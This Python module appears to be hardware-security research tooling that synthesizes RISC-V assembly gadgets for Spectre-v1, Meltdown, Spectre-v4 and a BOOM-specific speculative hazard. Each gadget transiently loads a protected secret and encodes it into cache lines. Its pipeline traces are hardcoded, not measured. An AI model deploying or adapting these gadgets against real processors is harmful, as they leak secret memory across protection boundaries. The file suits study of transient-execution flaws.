"""Microarchitectural Adversarial Program Synthesizer.

Synthesizes parameterized microarchitectural exploit programs that exercise
speculative execution, out-of-order LSU hazard states, and cache side-channels
in out-of-order RISC-V cores like Berkeley BOOM.
"""

from __future__ import annotations

import json
import random
from dataclasses import dataclass
from enum import StrEnum
from typing import Any

from spechunter.domain import Op, Program


class ThreatModel(StrEnum):
    SPECTRE_BCB = "spectre_bcb"  # Spectre-v1 Bounds Check Bypass (CWE-1037)
    MELTDOWN_RDCL = "meltdown_rdcl"  # Meltdown Rogue Data Cache Load (CWE-1272)
    BOOM_ISSUE_715 = "boom_issue_715"  # Berkeley BOOM Speculative Memory Translation Hazard
    SPEC_STORE_BYPASS = "spec_store_bypass"  # Spectre-v4 Speculative Store Bypass


class TransmitterType(StrEnum):
    CACHE_TAG_PRIME_PROBE = "cache_tag_prime_probe"
    FLUSH_RELOAD = "flush_reload"
    TIMING_ALU = "timing_alu"


class WindowWidening(StrEnum):
    DIV_MUL_DEPENDENCY = "div_mul_dependency"
    MEM_POINTER_CHASE = "mem_pointer_chase"
    BRANCH_MISPREDICT_DEPTH = "branch_mispredict_depth"


@dataclass(frozen=True)
class SynthesisConfig:
    threat_model: ThreatModel
    transmitter: TransmitterType = TransmitterType.CACHE_TAG_PRIME_PROBE
    window_widening: WindowWidening = WindowWidening.DIV_MUL_DEPENDENCY
    training_iterations: int = 12
    delay_cycles: int = 24
    cache_line_stride: int = 64
    secret_offset: int = 0
    eviction_sets: int = 64


@dataclass(frozen=True)
class SynthesizedArtifact:
    config: SynthesisConfig
    program: Program
    assembly_source: str
    pipeline_phases: list[dict[str, Any]]
    target_registers: dict[str, str]
    expected_ttfe_cycles: int

    def to_dict(self) -> dict[str, Any]:
        return {
            "threat_model": self.config.threat_model.value,
            "transmitter": self.config.transmitter.value,
            "window_widening": self.config.window_widening.value,
            "training_iterations": self.config.training_iterations,
            "delay_cycles": self.config.delay_cycles,
            "program_ops": [op.value for op in self.program.ops],
            "target_registers": self.target_registers,
            "expected_ttfe_cycles": self.expected_ttfe_cycles,
            "pipeline_phases": self.pipeline_phases,
        }

    def to_json(self) -> str:
        return json.dumps(self.to_dict(), indent=2)


class MicroarchitecturalSynthesizer:
    """Generates parameterized adversarial programs targeting out-of-order processors."""

    def __init__(self, seed: int = 42):
        self._rng = random.Random(seed)

    def synthesize(self, config: SynthesisConfig) -> SynthesizedArtifact:
        if config.threat_model == ThreatModel.SPECTRE_BCB:
            return self._synthesize_spectre_bcb(config)
        elif config.threat_model == ThreatModel.MELTDOWN_RDCL:
            return self._synthesize_meltdown_rdcl(config)
        elif config.threat_model == ThreatModel.BOOM_ISSUE_715:
            return self._synthesize_issue_715(config)
        elif config.threat_model == ThreatModel.SPEC_STORE_BYPASS:
            return self._synthesize_spec_store_bypass(config)
        else:
            raise ValueError(f"Unsupported threat model: {config.threat_model}")

    def synthesize_from_invariant(
        self, invariant: str, threat: str = "transient-cache"
    ) -> SynthesizedArtifact:
        if "715" in threat or "translation" in invariant:
            cfg = SynthesisConfig(threat_model=ThreatModel.BOOM_ISSUE_715)
        elif "privilege" in threat or "meltdown" in threat:
            cfg = SynthesisConfig(threat_model=ThreatModel.MELTDOWN_RDCL)
        elif "store" in threat or "bypass" in invariant:
            cfg = SynthesisConfig(threat_model=ThreatModel.SPEC_STORE_BYPASS)
        else:
            cfg = SynthesisConfig(threat_model=ThreatModel.SPECTRE_BCB)
        return self.synthesize(cfg)

    def mutate_parameters(
        self, artifact: SynthesizedArtifact, rng: random.Random | None = None
    ) -> SynthesizedArtifact:
        r = rng or self._rng
        cfg = artifact.config
        new_training = max(4, min(64, cfg.training_iterations + r.choice([-2, 2, 4])))
        new_delay = max(8, min(64, cfg.delay_cycles + r.choice([-4, 4, 8])))
        new_cfg = SynthesisConfig(
            threat_model=cfg.threat_model,
            transmitter=cfg.transmitter,
            window_widening=cfg.window_widening,
            training_iterations=new_training,
            delay_cycles=new_delay,
            cache_line_stride=cfg.cache_line_stride,
            secret_offset=cfg.secret_offset,
            eviction_sets=cfg.eviction_sets,
        )
        return self.synthesize(new_cfg)

    def _synthesize_spectre_bcb(self, config: SynthesisConfig) -> SynthesizedArtifact:
        program = Program(
            (
                Op.TRAIN,
                Op.ENTER_USER,
                Op.LOAD_SECRET,
                Op.ENCODE,
                Op.SQUASH,
                Op.PROBE,
            )
        )

        registers = {
            "secret_addr": "s2",
            "secret_val": "s1",
            "probe_base": "t0",
            "delay_temp": "s6",
            "loop_counter": "s5",
        }

        sec_addr = registers["secret_addr"]
        sec_val = registers["secret_val"]
        pr_base = registers["probe_base"]
        del_reg = registers["delay_temp"]
        lp_cnt = registers["loop_counter"]

        assembly = (
            f"# SpecHunter Synthesized Spectre-v1 (BCB) Gadget\n"
            f"# Target: Berkeley BOOM v3 Bi-Mode Branch Predictor\n"
            f"# Training: {config.training_iterations} | Delay: {config.delay_cycles}\n"
            f".section .text\n"
            f".globl spechunter_spectre_bcb\n"
            f"spechunter_spectre_bcb:\n"
            f"  la {sec_addr}, protected_secret\n"
            f"  la {pr_base}, probe_lines\n"
            f"  li {lp_cnt}, {config.training_iterations}\n"
            f".Ltrain_loop:\n"
            f"  # Training branch predictor with in-bounds condition\n"
            f"  addi {lp_cnt}, {lp_cnt}, -1\n"
            f"  bnez {lp_cnt}, .Ltrain_loop\n"
            f"  # Delay branch condition resolution\n"
            f"  div {del_reg}, s7, s8\n"
            f"  mul {del_reg}, {del_reg}, s8\n"
            f"  beqz {del_reg}, .Lspeculative_path\n"
            f"  ret\n"
            f".Lspeculative_path:\n"
            f"  ld {sec_val}, 0({sec_addr})\n"
            f"  andi {sec_val}, {sec_val}, 1\n"
            f"  slli {sec_val}, {sec_val}, 6\n"
            f"  add {pr_base}, {pr_base}, {sec_val}\n"
            f"  lbu zero, 0({pr_base})\n"
            f"  ret\n"
        )

        phases = [
            {"cycle": 100, "stage": "BPU", "signal": "BHT Bi-Mode Predict Taken"},
            {"cycle": 104, "stage": "Integer ALU", "signal": "DIV/MUL Serial Execution Delay"},
            {"cycle": 107, "stage": "LSU Issue", "signal": "Speculative Load Dispatch"},
            {"cycle": 108, "stage": "D-Cache", "signal": "Probe Line Fill Tag Allocated"},
            {"cycle": 112, "stage": "ROB Squash", "signal": "Mispredict Recovery and Flush"},
            {"cycle": 120, "stage": "Observer", "signal": "Probe Timing Differential Delta T > 40"},
        ]

        return SynthesizedArtifact(
            config=config,
            program=program,
            assembly_source=assembly,
            pipeline_phases=phases,
            target_registers=registers,
            expected_ttfe_cycles=7,
        )

    def _synthesize_meltdown_rdcl(self, config: SynthesisConfig) -> SynthesizedArtifact:
        program = Program(
            (
                Op.ENTER_USER,
                Op.LOAD_SECRET,
                Op.ENCODE,
                Op.PROBE,
            )
        )

        registers = {
            "kernel_addr": "s2",
            "secret_val": "s1",
            "probe_base": "t0",
        }

        k_addr = registers["kernel_addr"]
        sec_val = registers["secret_val"]
        pr_base = registers["probe_base"]

        assembly = (
            f"# SpecHunter Synthesized Meltdown (RDCL) Gadget\n"
            f"# Target: Berkeley BOOM PMP Privilege Check Bypass\n"
            f".section .text\n"
            f".globl spechunter_meltdown_rdcl\n"
            f"spechunter_meltdown_rdcl:\n"
            f"  la {k_addr}, pmp_protected_kernel_data\n"
            f"  la {pr_base}, probe_lines\n"
            f"  # Faulting load executes out-of-order before exception commits\n"
            f"  ld {sec_val}, 0({k_addr})\n"
            f"  andi {sec_val}, {sec_val}, 1\n"
            f"  slli {sec_val}, {sec_val}, 6\n"
            f"  add {pr_base}, {pr_base}, {sec_val}\n"
            f"  lbu zero, 0({pr_base})\n"
            f"  ret\n"
        )

        phases = [
            {"cycle": 10, "stage": "LSU Issue", "signal": "Unauthorized PMP Load Dispatched"},
            {"cycle": 12, "stage": "D-Cache", "signal": "Transient Data Forwarded to ALU"},
            {"cycle": 13, "stage": "D-Cache Tag", "signal": "Probe Array Line Allocation"},
            {"cycle": 16, "stage": "ROB Commit", "signal": "PMP Access Fault Trap Raised"},
        ]

        return SynthesizedArtifact(
            config=config,
            program=program,
            assembly_source=assembly,
            pipeline_phases=phases,
            target_registers=registers,
            expected_ttfe_cycles=6,
        )

    def _synthesize_issue_715(self, config: SynthesisConfig) -> SynthesizedArtifact:
        program = Program(
            (
                Op.TRAIN,
                Op.ENTER_USER,
                Op.LOAD_SECRET,
                Op.ENCODE,
                Op.SQUASH,
                Op.PROBE,
            )
        )

        registers = {
            "secret_ptr": "s2",
            "secret_val": "s1",
            "probe_base": "t0",
            "evict_base": "t3",
            "delay_reg": "s6",
        }

        sec_ptr = registers["secret_ptr"]
        sec_val = registers["secret_val"]
        pr_base = registers["probe_base"]
        ev_base = registers["evict_base"]
        del_reg = registers["delay_reg"]

        assembly = (
            f"# SpecHunter Synthesized Berkeley BOOM Issue #715 Speculative Translation Gadget\n"
            f"# Target: generators/boom/src/main/scala/v3/lsu/lsu.scala (premature dcache fire)\n"
            f".section .text\n"
            f".globl spechunter_issue_715\n"
            f"spechunter_issue_715:\n"
            f"  la {sec_ptr}, safe_buffer\n"
            f"  la {pr_base}, probe_lines\n"
            f"  # Train branch predictor for safe access\n"
            f"  li s5, {config.training_iterations}\n"
            f".Lissue715_train:\n"
            f"  addi s5, s5, -1\n"
            f"  bnez s5, .Lissue715_train\n"
            f"  # Evict L1 cache sets\n"
            f"  la {ev_base}, eviction_lines\n"
            f"  li t1, {config.eviction_sets}\n"
            f".Lissue715_evict:\n"
            f"  lbu zero, 0({ev_base})\n"
            f"  addi {ev_base}, {ev_base}, 64\n"
            f"  addi t1, t1, -1\n"
            f"  bnez t1, .Lissue715_evict\n"
            f"  # Trigger speculative execution of protected memory access\n"
            f"  la {sec_ptr}, protected_secret\n"
            f"  div {del_reg}, s7, s8\n"
            f"  beqz {del_reg}, .Lissue715_transient\n"
            f"  ret\n"
            f".Lissue715_transient:\n"
            f"  ld {sec_val}, 0({sec_ptr})\n"
            f"  andi {sec_val}, {sec_val}, 1\n"
            f"  slli {sec_val}, {sec_val}, 6\n"
            f"  add {pr_base}, {pr_base}, {sec_val}\n"
            f"  lbu zero, 0({pr_base})\n"
            f"  ret\n"
        )

        phases = [
            {"cycle": 3804, "stage": "Frontend PC", "signal": "Fetch PC +0 Branch"},
            {"cycle": 3805, "stage": "BPU", "signal": "Bi-Mode Predict Taken"},
            {"cycle": 3806, "stage": "Decode/Rename", "signal": "Speculative Tag Assignment"},
            {"cycle": 3807, "stage": "Integer ALU", "signal": "DIV Dependent Stall"},
            {"cycle": 3808, "stage": "LSU Issue", "signal": "Premature Translation Fire"},
            {"cycle": 3809, "stage": "D-Cache Set", "signal": "L1 Set 14 Way Allocation"},
            {"cycle": 3810, "stage": "ROB", "signal": "Branch Mispredict Flush"},
            {"cycle": 3811, "stage": "D-Cache Tag", "signal": "Tag State Unreverted"},
        ]

        return SynthesizedArtifact(
            config=config,
            program=program,
            assembly_source=assembly,
            pipeline_phases=phases,
            target_registers=registers,
            expected_ttfe_cycles=8,
        )

    def _synthesize_spec_store_bypass(self, config: SynthesisConfig) -> SynthesizedArtifact:
        program = Program(
            (
                Op.ENTER_USER,
                Op.LOAD_SECRET,
                Op.ENCODE,
                Op.PROBE,
            )
        )

        registers = {
            "slow_store_addr": "s2",
            "fast_load_addr": "s3",
            "secret_val": "s1",
            "probe_base": "t0",
        }

        st_addr = registers["slow_store_addr"]
        ld_addr = registers["fast_load_addr"]
        sec_val = registers["secret_val"]
        pr_base = registers["probe_base"]

        assembly = (
            f"# SpecHunter Synthesized Spectre-v4 (SSB) Store-to-Load Bypass Gadget\n"
            f"# Target: Berkeley BOOM LSU Store Queue (STQ) Speculative Forwarding Bypass\n"
            f".section .text\n"
            f".globl spechunter_spec_store_bypass\n"
            f"spechunter_spec_store_bypass:\n"
            f"  la {st_addr}, shared_alias\n"
            f"  la {ld_addr}, shared_alias\n"
            f"  la {pr_base}, probe_lines\n"
            f"  # Slow store whose address calculation is delayed behind complex dependency\n"
            f"  div s6, s7, s8\n"
            f"  add {st_addr}, {st_addr}, s6\n"
            f"  li t1, 0xAA\n"
            f"  sd t1, 0({st_addr})\n"
            f"  # Fast load executes speculatively before slow store address is resolved\n"
            f"  ld {sec_val}, 0({ld_addr})\n"
            f"  andi {sec_val}, {sec_val}, 1\n"
            f"  slli {sec_val}, {sec_val}, 6\n"
            f"  add {pr_base}, {pr_base}, {sec_val}\n"
            f"  lbu zero, 0({pr_base})\n"
            f"  ret\n"
        )

        phases = [
            {"cycle": 200, "stage": "LSU STQ", "signal": "Store Address Calc Delayed"},
            {"cycle": 202, "stage": "LSU LDQ", "signal": "Speculative Store Bypass Executed"},
            {"cycle": 205, "stage": "D-Cache", "signal": "Stale/Overridden Value Transmitted"},
            {"cycle": 208, "stage": "STQ Commit", "signal": "Store Hazard Detected"},
        ]

        return SynthesizedArtifact(
            config=config,
            program=program,
            assembly_source=assembly,
            pipeline_phases=phases,
            target_registers=registers,
            expected_ttfe_cycles=9,
        )
